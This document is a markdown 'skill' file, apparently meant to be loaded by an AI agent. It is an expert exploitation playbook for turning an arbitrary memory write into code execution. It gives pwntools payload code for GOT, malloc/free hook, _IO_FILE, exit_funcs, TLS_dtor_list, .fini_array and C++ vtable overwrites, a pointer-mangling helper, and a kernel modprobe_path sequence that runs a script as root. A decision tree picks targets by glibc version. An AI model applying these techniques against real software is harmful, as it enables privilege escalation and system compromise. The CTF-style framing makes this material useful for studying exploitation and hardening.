---
name: arbitrary-write-to-rce
description: >-
  Arbitrary write to RCE playbook. Use when you have an arbitrary write primitive (from heap exploitation, format string, or OOB write) and need to convert it into code execution by targeting GOT, hooks, _IO_FILE vtable, exit_funcs, TLS_dtor_list, modprobe_path, .fini_array, or C++ vtables.
---

# SKILL: Arbitrary Write to Code Execution — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert techniques for converting an arbitrary write primitive into code execution. Covers every major overwrite target organized by glibc version compatibility: GOT, __malloc_hook, __free_hook, _IO_FILE vtable, __exit_funcs, TLS_dtor_list, _dl_fini, modprobe_path, .fini_array, C++ vtable, and setcontext gadget. This is the "last mile" skill. Base models often target hooks that no longer exist (post-glibc 2.34) or miss pointer mangling requirements.

## 0. RELATED ROUTING

- [heap-exploitation](../heap-exploitation/SKILL.md) — obtaining the arbitrary write via heap attacks
- [format-string-exploitation](../format-string-exploitation/SKILL.md) — obtaining the arbitrary write via %n
- [stack-overflow-and-rop](../stack-overflow-and-rop/SKILL.md) — stack-based write primitives
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) — which targets are available given protection configuration
- [heap-exploitation IO_FILE_EXPLOITATION.md](../heap-exploitation/IO_FILE_EXPLOITATION.md) — deep _IO_FILE structure exploitation

---

## 1. TARGET SELECTION BY GLIBC VERSION

| Target | glibc < 2.24 | 2.24–2.33 | ≥ 2.34 | Required Knowledge |
|---|---|---|---|---|
| GOT overwrite | OK (Partial RELRO) | OK (Partial RELRO) | OK (Partial RELRO) | Binary base |
| `__malloc_hook` | OK | OK | **Removed** | libc base |
| `__free_hook` | OK | OK | **Removed** | libc base |
| `__realloc_hook` | OK | OK | **Removed** | libc base |
| `_IO_FILE` vtable (direct) | OK | Vtable range check | Vtable range check | libc base + heap |
| `_IO_FILE` via `_IO_str_jumps` | N/A | OK (2.24–2.27) | Patched | libc base + heap |
| `_IO_FILE` via `_IO_wfile_jumps` | N/A | OK (≥ 2.28) | OK | libc base + heap |
| `__exit_funcs` | OK | OK | OK | libc base + pointer guard |
| `TLS_dtor_list` | N/A | N/A | OK | TLS addr + pointer guard |
| `_dl_fini` / link_map | OK | OK | OK | ld.so base |
| `modprobe_path` (kernel) | OK | OK | OK | Kernel base |
| `.fini_array` | OK | OK | OK | Binary base (if writable) |
| C++ vtable | OK | OK | OK | Object address + heap |
| `setcontext` gadget | OK | OK (changed in 2.29) | OK | libc base |
| Stack return address | Always | Always | Always | Stack address |

---

## 2. GOT OVERWRITE

**Replace a function pointer in the Global Offset Table.**

### Requirements
- Partial RELRO (`.got.plt` writable) — Full RELRO blocks this entirely

### Common Targets

| Overwrite From | Overwrite To | Trigger |
|---|---|---|
| `printf@GOT` | `system` | Next `printf(user_input)` with input = `/bin/sh` |
| `free@GOT` | `system` | Next `free(ptr)` where ptr points to `"/bin/sh"` |
| `strlen@GOT` | `system` | Next `strlen(user_input)` |
| `atoi@GOT` | `system` | Next `atoi(user_input)` with input = `"sh"` |
| `puts@GOT` | `system` | Next `puts(user_input)` |
| `exit@GOT` | `main` or gadget | Create loop for multi-shot exploit |
| `__stack_chk_fail@GOT` | `ret` gadget | Neutralize canary check |

```python
# Format string GOT overwrite
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {elf.got['printf']: libc.sym['system']})

# Heap-based GOT overwrite (tcache poisoning)
# Allocate chunk at GOT address → write system address
```

---

## 3. __malloc_hook / __free_hook (glibc < 2.34)

### __malloc_hook

```python
# Overwrite __malloc_hook with one_gadget address
# Triggered by any malloc call (including internal malloc in printf with large format)
write(libc.sym['__malloc_hook'], one_gadget_addr)
# Trigger:
io.sendline('%100000c')  # printf calls malloc internally for large format
```

### __free_hook

```python
# Overwrite __free_hook with system
write(libc.sym['__free_hook'], libc.sym['system'])
# Trigger: free a chunk containing "/bin/sh"
chunk_data = b'/bin/sh\x00'
# ... allocate chunk with this data, then free it
```

### Realloc Trick for one_gadget Constraints

```python
# one_gadget often requires specific register/stack state
# realloc pushes registers and adjusts stack before calling __realloc_hook
# Set __malloc_hook = realloc+N (skip some pushes to adjust stack alignment)
# Set __realloc_hook = one_gadget
write(libc.sym['__realloc_hook'], one_gadget)
write(libc.sym['__malloc_hook'], libc.sym['realloc'] + 2)  # +2, +4, +6 etc. to adjust
```

---

## 4. _IO_FILE VTABLE

See [IO_FILE_EXPLOITATION.md](../heap-exploitation/IO_FILE_EXPLOITATION.md) for full details.

### Quick Summary by Version

| glibc | Method | Vtable Target |
|---|---|---|
| < 2.24 | Direct vtable overwrite | Point vtable to fake table with `system` at `__overflow` offset |
| 2.24–2.27 | `_IO_str_jumps` | Within valid range; `_IO_str_finish` calls `_s._free_buffer` |
| ≥ 2.28 | `_IO_wfile_jumps` | Wide-char path: `_wide_data->_wide_vtable` not range-checked |
| ≥ 2.35 | House of Cat | `_IO_wfile_seekoff` → `_IO_switch_to_wget_mode` → fake wide vtable call |

### FSOP Trigger

```python
# Overwrite _IO_list_all → fake FILE with crafted vtable
# Trigger via exit() or malloc abort → _IO_flush_all_lockp → _IO_OVERFLOW
```

---

## 5. __exit_funcs / __atexit

```c
// __exit_funcs is a linked list of function pointer entries called during exit()
// Each entry contains a flavor (cxa, on, at) and a function pointer
// Function pointers are MANGLED with pointer guard:
//   stored = ROL(ptr ^ __pointer_chk_guard, 0x11)
```

### Exploitation

```python
# Need: libc base + __pointer_chk_guard value (at fs:[0x30] or leaked)
# 1. Leak or brute-force pointer_guard
# 2. Compute mangled function pointer:
import struct
def mangle(ptr, guard):
    return ((ptr ^ guard) << 0x11 | (ptr ^ guard) >> (64-0x11)) & 0xffffffffffffffff

# 3. Write mangled one_gadget/system to __exit_funcs entry
# 4. Trigger: call exit() or return from main
```

### Without Pointer Guard Knowledge

If you can overwrite both the function pointer AND the pointer guard (in TLS at `fs:[0x30]`):
1. Set pointer guard to 0
2. Set function pointer to `ROL(target, 0x11)`
3. Demangling: `ROR(stored, 0x11) ^ 0 = ROR(ROL(target, 0x11), 0x11) = target`

---

## 6. TLS_dtor_list (glibc ≥ 2.34)

**Thread-local destructor list — the primary post-2.34 target.**

```c
// Called during __call_tls_dtors() in exit flow
// Each entry: { void (*func)(void *), void *obj, void *next }
// func is MANGLED same as exit_funcs (PTR_DEMANGLE)
```

### Location

```
TLS area (pointed by fs register on x86-64)
tls_dtor_list is a thread-local variable in libc
Typically at fs:[offset] — offset found via libc symbol or brute-force
```

### Exploitation

```python
# 1. Leak TLS base address (e.g., via canary leak: canary at fs:[0x28])
# 2. Compute tls_dtor_list address
# 3. Forge a tls_dtor_list entry:
entry = p64(mangled_func_ptr)  # func (mangled with pointer guard)
entry += p64(arg_value)         # obj (passed as argument to func)
entry += p64(0)                 # next = NULL (end of list)
# 4. Write entry to heap, set tls_dtor_list to point to it
# 5. Trigger: exit() → __call_tls_dtors() → func(obj)
```

---

## 7. _dl_fini / LINK_MAP CORRUPTION

### Attack Vector

During `exit()`, `_dl_fini` iterates the link_map list and calls `DT_FINI_ARRAY` entries.

```c
// In _dl_fini:
for each loaded library (link_map entry):
    if l_info[DT_FINI_ARRAY]:
        array = l_addr + l_info[DT_FINI_ARRAY]->d_un.d_ptr
        for each entry in array:
            entry()  // call destructor
```

### Exploitation

1. Corrupt a `link_map` entry's `l_addr` (relocation base) to shift the FINI_ARRAY pointer
2. Or corrupt `l_info[DT_FINI_ARRAY]` to point to fake array
3. Fake array contains target function pointer (system, one_gadget)
4. Trigger: `exit()` → `_dl_fini` → calls fake destructor

**Advantage**: No pointer mangling (function pointers in FINI_ARRAY are not mangled).

---

## 8. modprobe_path (KERNEL)

**Overwrite the kernel's `modprobe_path` to execute arbitrary commands as root.**

```python
# 1. Arbitrary kernel write: overwrite modprobe_path ("/sbin/modprobe")
#    with "/tmp/x" (attacker's script)
kernel_write(modprobe_path_addr, b'/tmp/x\x00')

# 2. Prepare script:
# echo '#!/bin/sh' > /tmp/x
# echo 'cat /flag > /tmp/output' >> /tmp/x
# chmod +x /tmp/x

# 3. Trigger: execute a file with unknown binary format
# echo -ne '\xff\xff\xff\xff' > /tmp/trigger
# chmod +x /tmp/trigger
# /tmp/trigger
# → kernel calls modprobe_path ("/tmp/x") as root
```

See [kernel-exploitation](../kernel-exploitation/SKILL.md) for kernel write primitives.

---

## 9. .fini_array

**Overwrite destructor function pointers called during normal program exit.**

```python
# .fini_array contains function pointers called in reverse order during exit
# Typically: [__do_global_dtors_aux, ...]
# Overwrite first entry with target (main for loop, system for RCE)

# Two-stage: .fini_array[0] = main (loop back), .fini_array[1] = <exploit_func>
# First exit: calls .fini_array[1] (exploit_func), then .fini_array[0] (main)
# In main loop: set up final exploit
```

**Limitation**: `.fini_array` may be read-only in Full RELRO binaries.

---

## 10. C++ VTABLE OVERWRITE

```cpp
// C++ objects with virtual functions have a vptr at offset 0
// vptr → vtable → array of function pointers
// Overwrite vptr to point to fake vtable with controlled function pointers

// Object layout:
// +0x00: vptr → [vtable_entry_0, vtable_entry_1, ...]
// +0x08: member data...
```

```python
# 1. Leak object address and vptr
# 2. Create fake vtable in controlled memory:
fake_vtable = p64(0)              # offset -0x10 (RTTI info)
fake_vtable += p64(0)             # offset -0x08 (RTTI info)
fake_vtable += p64(target_func)   # virtual function 0 → system / one_gadget
fake_vtable += p64(target_func)   # virtual function 1
# 3. Overwrite vptr to point to fake_vtable + 0x10 (skip RTTI prefix)
# 4. Trigger: call virtual function on the object
```

---

## 11. setcontext GADGET

`setcontext` in libc loads registers from a `ucontext_t` structure — useful as a pivot gadget.

### glibc < 2.29

```c
// setcontext+53: loads registers from [rdi + offsets]
// RDI = first argument = pointer to controlled buffer
// Sets RSP, RIP, and all other registers → full control
```

### glibc ≥ 2.29

```c
// setcontext+61: loads registers from [rdx + offsets]
// Must control RDX, not RDI
// Need an intermediate gadget: mov rdx, [rdi+X]; ... ; call/jmp [rdx+Y]
```

```python
# Common pattern with __free_hook (pre-2.34):
# __free_hook = setcontext + 61
# free(chunk) → setcontext(chunk) where chunk contains fake ucontext
# From ucontext: set RSP to ROP chain, RIP to ret → ROP continues

# Post-2.34: combine with _IO_FILE exploitation
# _IO_FILE vtable call passes fp as first arg → use gadget to move to rdx → setcontext
```

---

## 12. DECISION TREE

```
You have an arbitrary write primitive. What to target?

├── What's the RELRO level?
│   ├── None / Partial → GOT overwrite (simplest, most reliable)
│   │   └── printf→system, free→system, atoi→system
│   └── Full RELRO → GOT read-only, choose alternative:
│
├── What glibc version?
│   ├── < 2.34 (hooks available)
│   │   ├── __free_hook = system → free("/bin/sh") [easiest]
│   │   ├── __malloc_hook = one_gadget → trigger malloc [if constraints met]
│   │   └── __realloc_hook + __malloc_hook realloc trick [adjust stack alignment]
│   │
│   ├── ≥ 2.34 (no hooks)
│   │   ├── Know pointer guard (fs:[0x30])?
│   │   │   ├── YES → __exit_funcs or TLS_dtor_list
│   │   │   └── NO → overwrite pointer guard to 0 first, then exit_funcs
│   │   ├── _IO_FILE + _IO_wfile_jumps (House of Apple 2 / Cat)
│   │   │   └── Need: libc base + heap address + controllable FILE structure
│   │   ├── _dl_fini link_map corruption
│   │   │   └── Need: ld.so base address
│   │   └── .fini_array (if writable)
│   │       └── Need: binary base (no PIE, or PIE base leaked)
│   │
│   └── Any version
│       ├── Stack return address (if stack address known)
│       └── C++ vtable (if targeting C++ object with virtual functions)
│
├── Kernel write primitive?
│   ├── modprobe_path (simplest kernel→root)
│   ├── core_pattern (/proc/sys/kernel/core_pattern)
│   └── Direct cred structure overwrite
│
└── Need to chain read → write → execute?
    └── setcontext gadget: arbitrary write → pivot RSP → ROP chain
        ├── glibc < 2.29: setcontext+53 (uses RDI)
        └── glibc ≥ 2.29: setcontext+61 (uses RDX, need mov rdx, [rdi] gadget)
```
